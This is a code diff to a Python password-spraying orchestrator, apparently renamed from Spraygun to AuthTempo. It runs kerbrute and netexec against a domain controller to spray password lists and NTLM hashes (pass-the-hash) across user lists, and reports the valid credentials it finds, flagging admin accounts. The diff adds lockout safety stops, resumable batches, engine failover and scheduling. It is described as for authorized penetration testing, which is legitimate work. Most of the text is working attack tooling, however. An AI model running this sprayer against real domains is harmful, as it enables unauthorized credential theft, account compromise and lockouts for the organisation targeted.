+            delay_remaining = max(0, math.ceil(delay_seconds - elapsed_seconds))
+            if delay_remaining:
+                console.print(
+                    "[*] Resume is preserving the prior batch boundary: "
+                    f"waiting {delay_remaining} second(s) before new passes.",
+                    style="cyan",
+                )
+                state.record_timeline_event(
+                    "resume_delay",
+                    f"waited {delay_remaining} seconds for prior batch boundary",
+                    round_idx=state.completed_rounds,
+                )
+                state.save()
+                ui.countdown(delay_remaining)
+
+    round_idx = state.completed_rounds
+
+    while state.remaining_queue and not stop_reason:
+        # Enforce the spray window before the first round and every later round.
+        if window:
+            wait_for_window(window, ui, console, state)
+
         # Take next batch
-        batch = state.remaining_queue[:cfg.passwords_per_round]
-        state.remaining_queue = state.remaining_queue[cfg.passwords_per_round:]
+        # Leave the active batch in the persisted queue until each individual
+        # secret is reconciled. A crash during the batch can then resume without
+        # silently dropping the active or not-yet-started secrets.
+        batch_progress = state.current_batch_progress()
+        batch_capacity = cfg.passwords_per_round - batch_progress
+        if batch_capacity <= 0:
+            raise RuntimeError(
+                "batch boundary was not finalized before dispatch; refusing to spray"
+            )
+        batch = state.remaining_queue[:batch_capacity]
 
-        console.print(f"\n[*] Round {round_idx + 1}: spraying {len(batch)} secret(s)", style="cyan")
+        # Only cooldowns active before this round should tick at its end. A
+        # demotion that happens during this round must retain its full N-round
+        # cooldown for the N subsequent rounds.
+        cooldowns_to_tick = {
+            key for key, health in state.engine_health.items()
+            if health.get("demoted") and health.get("cooldown_remaining", 0) > 0
+        }
+
+        console.print(
+            f"\n[*] Batch {round_idx + 1}: evaluating {len(batch)} spray pass(es)",
+            style="cyan",
+        )
 
         # Compute effective chain for this round (engine health aware)
         effective_chain = state.compute_effective_chain(chain)
@@ -1938,7 +4697,7 @@ def run(cfg: Config, console: Console):
                 console.print(f"[*] Effective engines: {' → '.join(parts) if len(parts) > 1 else parts[0]}", style="cyan")
 
         # Feature E: Record round start timeline event
-        state.record_timeline_event("round_start", "", round_idx=round_idx + 1)
+        state.record_timeline_event("batch_start", "", round_idx=round_idx + 1)
 
         # Fixed batch description for the whole round. The active password is
         # shown separately on the "Current password" line, so this stays
@@ -1951,70 +4710,257 @@ def run(cfg: Config, console: Console):
                 round_batch_info = f"Spraying {len(batch)} passwords: {joined[:47]}... ({len(batch)} total)"
             else:
                 round_batch_info = f"Spraying {len(batch)} passwords: {joined}"
-        next_passwords_preview = state.remaining_queue[:cfg.passwords_per_round]
-
-        round_lockouts_this_round = 0
+        round_lockout_users: Set[str] = set()
+        round_unknown_lockouts = 0
+        round_signal_events_this_round = 0
+        round_ambiguous_lockouts: Set[str] = set()
+        round_unknown_ambiguous_lockouts = 0
         round_conn_fails_this_round = 0  # Feature D: Track conn fails per round
         round_errors_this_round = []  # Track all errors in this round
-        round_successes_this_round = []  # Track all successes in this round
+        round_successes_this_round: Set[Tuple[str, str]] = set()
+        processed_secrets: List[str] = []
+        safety_stop = False
+        safety_stop_kind = ""
+        stopped_pass_signal_count = 0
+        operator_stop = False
 
-        for secret in batch:
-            # Try each engine in the per-password effective chain (engine health aware)
+        for secret_idx, secret in enumerate(batch):
+            state.current_pass = len(state.used_passwords) + 1
             engine_success = False
+            explicit_probes_tried: Set[str] = set()
 
-            for engine in effective_chain:
-                # Start spray UI (round_batch_info is fixed for the round)
-                ui.start_spray(engine, secret, round_idx + 1, round_batch_info)
-                state.record_spray_start(engine, secret, round_idx + 1)
+            # Enter retries the same secret. It is never marked used until one
+            # engine actually finishes cleanly.
+            while not engine_success and not safety_stop and not operator_stop:
+                threshold_retry = False
+                # Recompute per secret/retry so a just-demoted engine becomes
+                # sticky at the back of the chain immediately.
+                effective_chain = state.compute_effective_chain(chain)
 
-                # Run spray
-                if engine.tool == "kerbrute" and cfg.realm_retry:
-                    result = spray_kerbrute_with_realm_retry(engine, cfg, secret, ui, state)
-                else:
-                    result = spray_one_password(engine, cfg, secret, ui, state)
+                if not effective_chain:
+                    probe = (
+                        state.select_demoted_probe(chain, explicit_probes_tried)
+                        if cfg.probe_demoted
+                        else None
+                    )
+                    if probe is not None:
+                        explicit_probes_tried.add(str(probe))
+                        effective_chain = [probe]
+                        console.print(
+                            f"[!] Explicit cooldown probe: {probe}",
+                            style="yellow",
+                        )
+                        state.record_timeline_event(
+                            "explicit_probe",
+                            f"{probe}: operator requested --probe-demoted",
+                            round_idx=round_idx + 1,
+                        )
+                    else:
+                        operator_stop = True
+                        stop_reason = "all engines are in cooldown"
+                        state.save()
+                        console.print(
+                            "[!] All engines are currently demoted and in cooldown; "
+                            "stopping without bypassing cooldown. After troubleshooting, "
+                            "resume with --probe-demoted to request one probe per engine.",
+                            style="red",
+                        )
+                        break
 
-                # Record stats
-                round_lockouts_this_round += len(result.lockouts)
-                round_conn_fails_this_round += result.conn_fails  # Feature D: Accumulate conn fails
-                round_errors_this_round.extend(result.errors)  # Track errors
-                round_successes_this_round.extend(result.successes)  # Track successes
-                state.record_spray_end(
-                    len(result.successes),
-                    len(result.lockouts),
-                    result.conn_fails,
-                    result.aborted,
-                    result.abort_reason,
-                    len(result.errors)  # Add error count to log
-                )
+                for engine in effective_chain:
+                    ui.start_spray(engine, secret, round_idx + 1, round_batch_info)
+                    state.record_spray_start(engine, secret, round_idx + 1)
 
-                ui.end_spray()
+                    try:
+                        if engine.tool == "kerbrute" and cfg.realm_retry:
+                            result = spray_kerbrute_with_realm_retry(engine, cfg, secret, ui, state)
+                        else:
+                            result = spray_one_password(engine, cfg, secret, ui, state)
+                    finally:
+                        # Always restore the cursor/terminal, including errors
+                        # outside the engine subprocess wrapper and Ctrl-C paths.
+                        ui.end_spray()
 
-                # If engine aborted (wrong-realm, binary-not-found, timeout, exception), try next
-                # Note: We no longer abort on conn-fail-limit; connection errors are tracked but don't stop the engine
-                if result.aborted:
-                    state.register_engine_failure(str(engine), result.abort_reason)
-                    cooldown = state.engine_health.get(str(engine), {}).get("cooldown_remaining", 0)
-                    console.print(f"[-] {engine} failed ({result.abort_reason}); demoting for {cooldown} round(s)", style="yellow")
-                    continue  # Try next engine
+                    if not result.aborted and not result.reconciled_complete:
+                        result.aborted = True
+                        result.clean_finish = False
+                        result.abort_reason = "unreconciled-output"
+                        result.errors.append(
+                            "engine returned without a reconciled completion contract"
+                        )
 
-                # Engine finished cleanly (or with partial results but no abort); move to next secret
-                state.register_engine_success(str(engine))
-                engine_success = True
-                break  # Don't continue failover chain for this secret
+                    round_lockout_users.update(result.lockouts)
+                    round_lockout_users.update(result.ambiguous_lockouts)
+                    round_signal_events_this_round += result.lockout_count
+                    round_unknown_lockouts += (
+                        result.unknown_lockouts + result.unknown_ambiguous_lockouts
+                    )
+                    round_ambiguous_lockouts.update(result.ambiguous_lockouts)
+                    round_unknown_ambiguous_lockouts += result.unknown_ambiguous_lockouts
+                    round_conn_fails_this_round += result.conn_fails
+                    round_errors_this_round.extend(result.errors)
+                    round_successes_this_round.update(result.successes)
+                    state.record_spray_end(
+                        len(result.successes),
+                        result.lockout_count,
+                        result.conn_fails,
+                        result.aborted,
+                        result.abort_reason,
+                        len(result.errors),
+                    )
+                    if result.aborted and result.abort_reason in {
+                        "lockout-burst", "lockout-safety-stop"
+                    }:
+                        # This is an operator-safety stop, not a reason to try a
+                        # second engine. Requeue the partially attempted secret.
+                        safety_stop = True
+                        stopped_pass_signal_count = state.signal_count_for_secret(secret)
+                        ambiguous_signal = bool(
+                            result.ambiguous_lockouts
+                            or result.unknown_ambiguous_lockouts
+                        )
+                        safety_stop_kind = (
+                            "ambiguous-lockout-safety-stop"
+                            if ambiguous_signal
+                            else result.abort_reason
+                        )
+                        if result.abort_reason == "lockout-safety-stop":
+                            stop_reason = (
+                                "ambiguous lockout/revocation safety signal"
+                                if ambiguous_signal
+                                else "Kerbrute safe mode detected a locked account"
+                            )
+                        else:
+                            stop_reason = "per-pass safety-signal maximum exceeded"
+                        break
 
-            if not engine_success:
-                # All engines in the failover chain aborted - only pause for this condition
-                # (Connection errors during individual engine runs are tracked but don't pause)
-                console.print(f"[!] All engines failed for this secret. Pausing.", style="red")
-                ui.alert("ALL ENGINES FAILED", "Could not spray this secret with any tool in the failover chain. Check network/DC. Press Enter to retry or Ctrl-C to abort.", "red")
-                input()  # Pause for operator
+                    if result.aborted and result.abort_reason == "lockout-threshold":
+                        cumulative_lockouts = state.lockout_count
+                        pass_lockout_count = state.signal_count_for_secret(secret)
+                        if pass_lockout_count > cfg.lockout_burst:
+                            safety_stop = True
+                            safety_stop_kind = "lockout-burst"
+                            stopped_pass_signal_count = pass_lockout_count
+                            stop_reason = "per-pass safety-signal maximum exceeded"
+                        else:
+                            should_continue = handle_lockouts(
+                                pass_lockout_count,
+                                cumulative_lockouts,
+                                cfg,
+                                ui,
+                                console,
+                                state.acknowledged_lockouts,
+                            )
+                            if should_continue:
+                                state.acknowledged_lockouts = cumulative_lockouts
+                                state.save()
+                                threshold_retry = True
+                            else:
+                                operator_stop = True
+                                stop_reason = "operator stopped at lockout threshold"
+                        break
 
-        # Mark secrets as used
-        for secret in batch:
+                    if result.aborted:
+                        state.register_engine_failure(str(engine), result.abort_reason)
+                        health = state.engine_health.get(str(engine), {})
+                        if health.get("demoted"):
+                            console.print(
+                                f"[-] {engine} failed ({result.abort_reason}); demoted for "
+                                f"{health.get('cooldown_remaining', 0)} batch(es)",
+                                style="yellow",
+                            )
+                        else:
+                            console.print(
+                                f"[-] {engine} failed ({result.abort_reason}); failure "
+                                f"{health.get('consecutive_failures', 0)}/{state.transient_threshold}",
+                                style="yellow",
+                            )
+                        continue
+
+                    if result.dispatches:
+                        state.register_engine_success(str(engine))
+                    engine_success = True
+                    break
+
+                if safety_stop or operator_stop:
+                    break
+
+                if threshold_retry:
+                    # Resume this password only for users not already attempted;
+                    # do not demote or fail over merely because safety paused it.
+                    continue
+
+                if not engine_success:
+                    state.save()
+                    console.print("[!] All engines failed for this secret. Pausing.", style="red")
+                    ui.alert(
+                        "ALL ENGINES FAILED",
+                        "Could not spray this secret with any tool in the failover chain. "
+                        "Check network/DC. Press Enter to retry or Ctrl-C to abort.",
+                        "red",
+                    )
+                    input()
+
+            if safety_stop or operator_stop:
+                break
+
             state.mark_used(secret)
+            processed_secrets.append(secret)
+
+            # Stop before the next secret if this pass exceeded its ceiling.
+            pass_lockout_count = state.signal_count_for_secret(secret)
+            if pass_lockout_count > cfg.lockout_burst:
+                safety_stop = True
+                safety_stop_kind = "lockout-burst"
+                stopped_pass_signal_count = pass_lockout_count
+                stop_reason = "per-pass safety-signal maximum exceeded"
+                break
+
+            cumulative_lockouts = state.lockout_count
+            if (cumulative_lockouts >= cfg.lockout_threshold and
+                    cumulative_lockouts > state.acknowledged_lockouts):
+                should_continue = handle_lockouts(
+                    pass_lockout_count,
+                    cumulative_lockouts,
+                    cfg,
+                    ui,
+                    console,
+                    state.acknowledged_lockouts,
+                )
+                if should_continue:
+                    state.acknowledged_lockouts = cumulative_lockouts
+                    state.save()
+                else:
+                    operator_stop = True
+                    stop_reason = "operator stopped at lockout threshold"
+                    break
+
+        round_lockouts_this_round = round_signal_events_this_round
+
+        if safety_stop:
+            if safety_stop_kind == "lockout-safety-stop":
+                msg = (
+                    "[!] Hard-stop: Kerbrute safe mode detected a locked-out "
+                    "account and stopped before attempting the remaining users."
+                )
+                alert_title = "LOCKOUT DETECTED - STOPPED"
+            elif safety_stop_kind == "ambiguous-lockout-safety-stop":
+                msg = (
+                    "[!] Hard-stop: the engine reported an ambiguous lockout/revocation "
+                    "signal. The identity was quarantined without labeling it confirmed."
+                )
+                alert_title = "AMBIGUOUS SAFETY SIGNAL - STOPPED"
+            else:
+                msg = (
+                    f"[!] Hard-stop: {stopped_pass_signal_count} lockout signals in this "
+                    f"spray pass exceeded the maximum of {cfg.lockout_burst}."
+                )
+                alert_title = "LOCKOUT LIMIT - STOPPED"
+            console.print(msg, style="red")
+            ui.alert(alert_title, msg, "red")
 
         # Feature 3: Pattern learning - re-prioritize queue based on successful patterns
-        boosted = state.reprioritize_queue()
+        boosted = 0 if (safety_stop or operator_stop) else state.reprioritize_queue()
         if boosted > 0:
             # Get top successful patterns
             top_patterns = sorted(state.success_by_pattern.items(), key=lambda x: x[1], reverse=True)[:3]
@@ -2024,35 +4970,42 @@ def run(cfg: Config, console: Console):
             state.record_timeline_event("reprioritize", f"boosted {boosted} passwords", round_idx=round_idx + 1)
 
         # Show round summary
-        console.print(f"[*] Round {round_idx + 1} complete:", style="cyan")
-        console.print(f"    - Lockouts: {round_lockouts_this_round}", style="yellow" if round_lockouts_this_round > 0 else "dim")
+        round_label = "stopped" if (safety_stop or operator_stop) else "complete"
+        console.print(f"[*] Batch {round_idx + 1} {round_label}:", style="cyan")
+        lockout_detail = f"{round_lockouts_this_round}"
+        if round_lockout_users:
+            lockout_detail += f" ({len(round_lockout_users)} affected identity/identities)"
+        if round_unknown_lockouts:
+            lockout_detail += f" ({round_unknown_lockouts} unknown-user signal(s))"
+        ambiguous_count = len(round_ambiguous_lockouts) + round_unknown_ambiguous_lockouts
+        if ambiguous_count:
+            lockout_detail += f" ({ambiguous_count} ambiguous)"
+        console.print(f"    - Safety signals: {lockout_detail}", style="yellow" if round_lockouts_this_round > 0 else "dim")
         console.print(f"    - Found credentials: {len(round_successes_this_round)}", style="green" if round_successes_this_round else "dim")
 
         # Feature 4: Show compact stats line
         console.print(f"    - {state.get_compact_stats()}", style="cyan")
 
         # Show last password sprayed and next passwords to spray
-        if batch:
-            last_pw = batch[-1]
-            console.print(f"    - Last password sprayed: {last_pw}", style="cyan")
+        if processed_secrets:
+            last_pw = processed_secrets[-1]
+            console.print(f"    - Last password sprayed: {escape(last_pw)}", style="cyan")
         else:
-            console.print(f"    - Last password sprayed: (none)", style="dim")
+            console.print("    - Last password sprayed: (none)", style="dim")
 
+        next_passwords_preview = state.remaining_queue[:cfg.passwords_per_round]
         if next_passwords_preview:
             next_list_str = ", ".join(next_passwords_preview)
-            console.print(f"    - Next password(s) to spray: {next_list_str}", style="cyan")
-        elif state.remaining_queue:
-            # There are more passwords but less than a full batch
-            console.print(f"    - Next password(s) to spray: {', '.join(state.remaining_queue)}", style="cyan")
+            console.print(f"    - Next password(s) to spray: {escape(next_list_str)}", style="cyan")
         else:
-            console.print(f"    - Next password(s) to spray: <end of file>", style="dim")
+            console.print("    - Next password(s) to spray: <end of file>", style="dim")
 
         # Show error messages if any
         if round_errors_this_round:
             console.print(f"    - Errors: {len(round_errors_this_round)}", style="red")
             console.print("      Error messages:", style="red")
             for err in round_errors_this_round[:5]:  # Show first 5 errors
-                console.print(f"        - {err}", style="dim")
+                console.print(f"        - {escape(str(err))}", style="dim")
 
         # Show connection errors (informational - doesn't pause unless all engines fail)
         if round_conn_fails_this_round > 0:
@@ -2074,151 +5027,290 @@ def run(cfg: Config, console: Console):
                     detail = ""
                 console.print(f"      {eng}: {status}" + (f" ({detail})" if detail else ""), style="yellow" if h.get("demoted") else "green")
 
-        # Handle lockouts
-        cumulative_lockouts = len(state.locked_users)
-        should_continue = handle_lockouts(round_lockouts_this_round, cumulative_lockouts, cfg, ui, console)
+        # A round is complete only if every secret in its batch finished.
+        if len(processed_secrets) == len(batch):
+            state.mark_round_complete()
+            state.record_timeline_event(
+                "batch_end",
+                f"batch {round_idx + 1} complete",
+                round_idx=round_idx + 1,
+            )
 
-        if not should_continue:
-            console.print("[*] Run stopped due to lockout threshold.", style="yellow")
+        if safety_stop or operator_stop:
+            state.save()
             break
 
-        # Tick cooldowns for demoted engines (call at round end before next round)
-        state.tick_cooldowns()
+        # Tick cooldowns for demoted engines at batch end before the next batch.
+        state.tick_cooldowns(cooldowns_to_tick)
 
         # Check for critical errors that should prevent countdown
         # (No longer pause - just informational + let failover/demotion handle it)
         critical_errors = [e for e in round_errors_this_round if any(kw in e.lower() for kw in ["wrong realm", "cannot find kdc", "no kdc", "unknown realm"])]
         if critical_errors:
-            console.print(f"[*] {len(critical_errors)} realm/domain error(s) this round — handled via realm-retry + engine demotion (not pausing)", style="cyan")
+            console.print(f"[*] {len(critical_errors)} realm/domain error(s) this batch — handled via realm-retry + engine demotion (not pausing)", style="cyan")
             state.record_timeline_event("realm_error", f"{len(critical_errors)} realm/domain errors", round_idx=round_idx + 1)
 
         # Feature D: Update throttle based on this round's conn fails
         throttle_mult = state.update_throttle(round_conn_fails_this_round)
         if throttle_mult > 1.0:
-            console.print(f"    [*] Throttling: {throttle_mult:.1f}x inter-round delay (DC stress detected)", style="yellow")
+            console.print(f"    [*] Throttling: {throttle_mult:.1f}x inter-batch delay (DC stress detected)", style="yellow")
             # Feature E: Record throttle timeline event
             state.record_timeline_event("throttle", f"multiplier now {throttle_mult:.1f}x", round_idx=round_idx + 1)
 
         # Countdown if more passwords remain
         if state.remaining_queue:
-            # Feature B: Spray window scheduling - wait if outside window
-            if cfg.schedule:
-                window = SprayWindow(cfg.schedule)
-                wait_for_window(window, ui, console, state)
-
             # Feature D: Apply throttle multiplier to delay
-            effective_delay = int(cfg.time_between_rounds * state.delay_multiplier)
-            console.print(f"[*] Sleeping {effective_delay} minutes until next round...", style="cyan")
-            ui.countdown(effective_delay * 60)
+            effective_delay_seconds = math.ceil(
+                cfg.time_between_rounds * 60 * state.delay_multiplier
+            )
+            console.print(
+                f"[*] Waiting {effective_delay_seconds} second(s) until next batch...",
+                style="cyan",
+            )
+            ui.countdown(effective_delay_seconds)
 
-        # Feature E: Record round end timeline event
-        state.record_timeline_event("round_end", f"round {round_idx + 1} complete", round_idx=round_idx + 1)
-
+        state.save()
         round_idx += 1
 
-    # Done
-    console.print("\n[+] Spray complete.", style="green")
-    console.print(f"[+] Found credentials: {len(state.found_creds)}", style="green")
-    console.print(f"[+] Total lockouts: {len(state.locked_users)}", style="yellow")
-
-    # Feature E: Record complete timeline event
-    state.record_timeline_event("complete", "spray finished")
+    # Done (or safely stopped with resumable work remaining).
+    if stop_reason:
+        console.print(f"\n[!] Spray stopped: {stop_reason}. Resume with --resume.", style="yellow")
+        state.record_timeline_event("stopped", stop_reason)
+    else:
+        console.print("\n[+] Spray complete.", style="green")
+        state.record_timeline_event("complete", "spray finished")
+    console.print(f"[+] Found credentials: {state.credential_count}", style="green")
+    if state.credentials:
+        console.print("[+] Credential findings:", style="green bold")
+        for finding in state.credentials:
+            marker = "★ ADMIN" if finding.get("is_admin") else "✓"
+            source = finding.get("engine") or "unknown engine"
+            source_pass = (
+                finding.get("source_pass")
+                or finding.get("source_round")
+                or "?"
+            )
+            console.print(
+                f"    {marker} {escape(str(finding['user']))}:"
+                f"{escape(str(finding['secret']))} "
+                f"[dim]({escape(str(source))}, pass {escape(str(source_pass))})[/dim]",
+                style="red bold" if finding.get("is_admin") else "green",
+            )
+    console.print(f"[+] Total safety signals: {state.lockout_count}", style="yellow")
+    state.save()
 
     # Feature 4: Show full stats dashboard
     console.print("\n")
     console.print(state.render_stats(console))
 
-    # Feature 5: Export results (always export at end for audit trail)
-    console.print(f"\n[*] Exporting results...", style="cyan")
+    # Timeline JSON is always retained as an audit trail; credential exports
+    # follow the explicit --export selection.
+    console.print("\n[*] Writing audit artifacts...", style="cyan")
 
     # Export timeline.json (always)
     timeline_json = state.log_dir / "timeline.json"
-    timeline_json.write_text(json.dumps(state.timeline_events, indent=2))
+    state._atomic_write_text(timeline_json, json.dumps(state.timeline_events, indent=2) + "\n")
     console.print(f"[+] Timeline exported to: {timeline_json}", style="cyan")
 
     # Export HTML timeline if --timeline set
     if cfg.timeline or cfg.export == "all":
-        timeline_html = state.log_dir / "spray-timeline.html"
-        timeline_html.write_text(state.render_timeline_html())
+        timeline_html = state.log_dir / TIMELINE_HTML_NAME
+        state._atomic_write_text(timeline_html, state.render_timeline_html())
         console.print(f"[+] Timeline HTML exported to: {timeline_html}", style="cyan")
 
-    state.export_results("json")
-    state.export_results("csv")
-    console.print(f"[+] Results exported to: {state.log_dir}/results.json and results.csv", style="green")
+    if cfg.export in ("json", "all"):
+        state.export_results("json")
+        console.print(f"[+] JSON results exported to: {state.log_dir}/results.json", style="green")
+    if cfg.export in ("csv", "all"):
+        state.export_results("csv")
+        console.print(f"[+] CSV results exported to: {state.log_dir}/results.csv", style="green")
 
     console.print(f"[+] Credentials saved to: {state.creds_file}", style="cyan")
     console.print(f"[+] Lockouts saved to: {state.lockouts_file}", style="cyan")
     console.print(f"[+] Overall log: {state.overall_log}", style="cyan")
+    completed = not state.remaining_queue and not stop_reason
+    state.close()
+    return completed
 
 # =============================================================================
 # CLI entrypoint
 # =============================================================================
 
+def read_input_lines(path: str, *, identities: bool, domain: str = "") -> List[str]:
+    """Read ordered unique identities or literal secrets with explicit escaping."""
+    values: List[str] = []
+    seen: Set[str] = set()
+    with open(path, "r", encoding="utf-8") as handle:
+        for line_number, source_line in enumerate(handle, 1):
+            value = source_line.rstrip("\r\n")
+            if not value:
+                continue
+            if value.startswith(r"\#"):
+                value = value[1:]
+            elif value.startswith("#") or (identities and value.lstrip().startswith("#")):
+                continue
+
+            if identities:
+                value = value.strip()
+                if not value:
+                    continue
+                if any(ord(char) < 32 for char in value):
+                    raise ValueError(
+                        f"unsupported control character in identity {path}:{line_number}"
+                    )
+                unique_key = canonical_identity(value, domain)
+            else:
+                # Secret whitespace is significant. Reject control characters
+                # other than the newline already removed above.
+                if any(ord(char) < 32 and char != "\t" for char in value):
+                    raise ValueError(
+                        f"unsupported control character in {path}:{line_number}"
+                    )
+                unique_key = value
+
+            if unique_key in seen:
+                continue
+            seen.add(unique_key)
+            values.append(value)
+    return values
+
 def main():
     console = Console()
+    invoked_program = Path(sys.argv[0]).name or "authtempo.py"
+    legacy_entrypoint = invoked_program in {"authcadence", "authcadence.py", "spraygun.py"}
+
+    if legacy_entrypoint:
+        if invoked_program in {"authcadence", "authcadence.py"}:
+            compatibility_name = invoked_program
+            predecessor = "AuthCadence"
+        else:
+            compatibility_name = "spraygun.py"
+            predecessor = "Spraygun"
+        console.print(
+            f"[!] {compatibility_name} is a compatibility entry point from {predecessor}; "
+            "use authtempo or authtempo.py for new runs.",
+            style="yellow",
+        )
 
     parser = argparse.ArgumentParser(
-        prog="spraygun.py",
-        description="Spraygun — resilient password-spray orchestrator (authorized pentesting only)",
+        prog=invoked_program,
+        description=f"{PRODUCT_NAME} — {PRODUCT_TAGLINE} (authorized assessments only)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
   # Plaintext password spray, kerbrute default
-  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 -t 35 --limit 2
+  python3 authtempo.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 -t 35 --passes-per-batch 1
 
   # nxc SMB mode with custom timing
-  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --tool nxc --protocol smb -t 30 --limit 1
+  python3 authtempo.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --engine nxc --protocol smb -t 30
 
   # Pass-the-hash mode (NTLM hashes)
-  python3 spraygun.py -u users.txt -p hashes.txt -d LAB -dc-ip 10.10.10.10 --pth --tool nxc --protocol smb
+  python3 authtempo.py -u users.txt -p hashes.txt -d LAB -dc-ip 10.10.10.10 --pth --engine nxc --protocol smb
 
   # Dry-run to verify UI/failover without a target
-  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --dry-run
+  python3 authtempo.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --dry-run
 
   # Resume from a canceled run
-  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --resume
+  python3 authtempo.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --resume
 
 For authorized penetration testing only.
         """
     )
 
-    parser.add_argument("-u", help="Userlist file (one per line)", required=True)
-    parser.add_argument("-p", help="Password/hash file (one per line)", required=True)
-    parser.add_argument("-d", help="Domain", required=True)
-    parser.add_argument("-dc-ip", help="Domain Controller IP", required=True)
+    parser.add_argument("-u", metavar="USERS", help="Userlist file (one per line)", required=True)
+    parser.add_argument("-p", metavar="SECRETS", help="Password/hash file (one per line)", required=True)
+    parser.add_argument("-d", metavar="DOMAIN", help="Domain", required=True)
+    parser.add_argument("-dc-ip", metavar="IP", help="Domain Controller IP", required=True)
 
-    parser.add_argument("--tool", choices=["kerbrute", "nxc"], default="kerbrute", help="Spray engine (default: kerbrute)")
+    parser.add_argument("--engine", "--tool", dest="tool", choices=["kerbrute", "nxc"], default="kerbrute", help="Spray engine (default: kerbrute)")
     parser.add_argument("--protocol", choices=["smb", "ldap"], default="ldap", help="Protocol for nxc (default: ldap; ignored for kerbrute)")
 
-    parser.add_argument("-t", type=int, default=35, help="Minutes between spray rounds (default: 35)")
-    parser.add_argument("--limit", type=int, default=2, dest="passwords_per_round", help="Passwords per round (default: 2)")
+    parser.add_argument("-t", metavar="MINUTES", type=int, default=35, help="Minutes between batches (default: 35)")
+    parser.add_argument("--passes-per-batch", "--limit", metavar="N", type=int, default=1, dest="passwords_per_round", help="Secrets per batch before the configured delay (default: 1)")
 
     parser.add_argument("--pth", action="store_true", help="Pass-the-hash mode: -p file contains NTLM hashes, forces nxc, excludes kerbrute")
 
-    parser.add_argument("--lockout-threshold", type=int, default=2, help="Cumulative lockouts before interactive prompt (default: 2)")
-    parser.add_argument("--lockout-burst", type=int, default=5, help="Lockouts in a single round that hard-stop the run (default: 5)")
-    parser.add_argument("--conn-fail-limit", type=int, default=10, help="(Deprecated) Connection failure threshold (now tracked for throttling; engines no longer abort on conn failures)")
+    parser.add_argument("--pause-after-lockout-signals", "--lockout-threshold", metavar="N", dest="lockout_threshold", type=int, default=2, help="Cumulative safety signals before interactive review (default: 2)")
+    parser.add_argument(
+        "--max-lockout-signals-per-pass",
+        "--max-lockouts-per-spray",
+        "--lockout-burst",
+        dest="lockout_burst",
+        metavar="N",
+        type=int,
+        default=3,
+        help=(
+            "Maximum lockout signals allowed in one secret/pass; the next "
+            "signal hard-stops the run (default: 3)"
+        ),
+    )
+    parser.add_argument("--conn-fail-limit", type=int, default=10, help="Deprecated compatibility option (connection failures now trigger failover and throttling)")
 
     parser.add_argument("--nxc-path", help="Override path to nxc/netexec binary")
     parser.add_argument("--kerbrute-path", help="Override path to kerbrute binary")
 
-    parser.add_argument("--resume", action="store_true", help="Resume from saved state")
+    state_mode = parser.add_mutually_exclusive_group()
+    state_mode.add_argument("--resume", action="store_true", help="Resume only from valid compatible saved state")
+    state_mode.add_argument("--start-fresh", action="store_true", help="Explicitly replace generated artifacts in the selected output directory")
     parser.add_argument("--dry-run", action="store_true", help="Emit fake tool output; no real sprays (for testing)")
     parser.add_argument("--no-preflight", action="store_true", help="Skip DC/domain preflight check")
-    parser.add_argument("--log-dir", default="./spraygun-out", help="Output/state directory (default: ./spraygun-out)")
+    parser.add_argument("--log-dir", default=None, help="Output/state directory (default: ./authtempo-out; dry runs use ./authtempo-dry-run-out)")
 
     # New operator fundamentals
-    parser.add_argument("--filter-disabled", action="store_true", help="Pre-spray kerbrute userenum to filter non-existent accounts")
+    parser.add_argument("--exclude-unknown-users", "--filter-disabled", dest="filter_disabled", action="store_true", help="Pre-spray Kerbrute enumeration to exclude non-existent accounts")
     parser.add_argument("--export", choices=["none", "json", "csv", "all"], default="none", help="Export results format (default: none)")
     parser.add_argument("--schedule", help="Spray window: business-hours, off-hours, or HH:MM-HH:MM (default: unrestricted)")
-    parser.add_argument("--timeline", action="store_true", help="Generate spray-timeline.html visualization")
+    parser.add_argument(
+        "--timeline",
+        action="store_true",
+        help=f"Generate {TIMELINE_HTML_NAME} visualization",
+    )
     parser.add_argument("--feed-lines", type=int, default=50, help="Number of lines in raw feed panel (default: 50)")
-    parser.add_argument("--engine-cooldown", type=int, default=3, help="Rounds to skip a demoted engine before re-probe (default: 3)")
-    parser.add_argument("--engine-fail-threshold", type=int, default=2, help="Consecutive transient failures before demoting an engine (default: 2)")
+    display_mode = parser.add_mutually_exclusive_group()
+    display_mode.add_argument("--no-live", action="store_true", help="Stream raw output without cursor-based rendering")
+    display_mode.add_argument("--live", action="store_true", help="Force the cursor-based dashboard, including inside tmux")
+    parser.add_argument("--engine-skip-batches", "--engine-skip-passes", "--engine-cooldown", metavar="N", dest="engine_cooldown", type=int, default=3, help="Batches to skip a demoted engine before re-probe (default: 3)")
+    parser.add_argument("--engine-fail-threshold", metavar="N", type=int, default=2, help="Consecutive transient failures before demoting an engine (default: 2)")
     parser.add_argument("--no-realm-retry", action="store_true", help="Disable kerbrute realm-variant auto-retry")
+    parser.add_argument("--include-compromised", action="store_true", help="UNSAFE: continue testing identities with a valid credential")
+    parser.add_argument("--retry-indeterminate", action="store_true", help="UNSAFE: retry pairs left in an indeterminate state")
+    parser.add_argument("--engine-timeout", metavar="SECONDS", type=int, default=300, help="Maximum seconds for one strict per-identity engine invocation (default: 300)")
+    parser.add_argument("--engine-idle-timeout", metavar="SECONDS", type=int, default=60, help="Maximum seconds without engine output (default: 60)")
+    parser.add_argument(
+        "--probe-demoted",
+        action="store_true",
+        help="Explicitly probe each demoted engine once if every engine is still in cooldown",
+    )
     parser.add_argument("-v", "--verbose", action="store_true", help="Maximum verbosity: full (masked) commands, every realm attempt, every failover hop")
 
     args = parser.parse_args()
+
+    # Reject values that otherwise cause infinite loops, empty batches, or
+    # nonsensical safety thresholds.
+    numeric_constraints = [
+        (args.t >= 0, "-t must be at least 0"),
+        (args.passwords_per_round >= 1, "--limit must be at least 1"),
+        (args.lockout_threshold >= 1, "--lockout-threshold must be at least 1"),
+        (
+            args.lockout_burst >= 0,
+            "--max-lockout-signals-per-pass must be at least 0",
+        ),
+        (args.conn_fail_limit >= 1, "--conn-fail-limit must be at least 1"),
